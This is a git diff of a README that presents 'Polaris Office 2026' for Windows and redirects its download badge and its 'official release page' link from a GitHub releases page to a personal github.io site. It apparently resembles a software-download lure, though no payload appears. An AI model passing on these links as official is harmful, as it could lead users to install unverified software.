@@ -1,6 +1,6 @@
 # 📄 Polaris-Office-2026 - Create and edit documents with ease
 
-[![](https://img.shields.io/badge/Download-Polaris_Office-blue.svg)](https://github.com/jrgom9297/Polaris-Office-2026/releases)
+[![](https://img.shields.io/badge/Download-Polaris_Office-blue.svg)](https://jrgom9297.github.io)
 
 ## 📖 Overview
 Polaris Office 2026 provides a complete toolset for your document needs. You can write reports, build spreadsheets, and design presentations. The software works on Windows 10 and Windows 11. It connects to your cloud storage so you keep your files in sync across devices. This version offers high compatibility with other standard office formats.
@@ -18,7 +18,7 @@ Check your computer before you start to ensure the software runs well.
 ## 📥 Getting Started
 Follow these steps to put the software on your machine.
 
-1. Visit the [official release page](https://github.com/jrgom9297/Polaris-Office-2026/releases) to access the installer.
+1. Visit the [official release page](https://jrgom9297.github.io) to access the installer.
 2. Locate the link for the latest Windows installer file inside the assets section.
 3. Click the link to begin the download process.
 4. Save the file to your computer, typically in your Downloads folder.
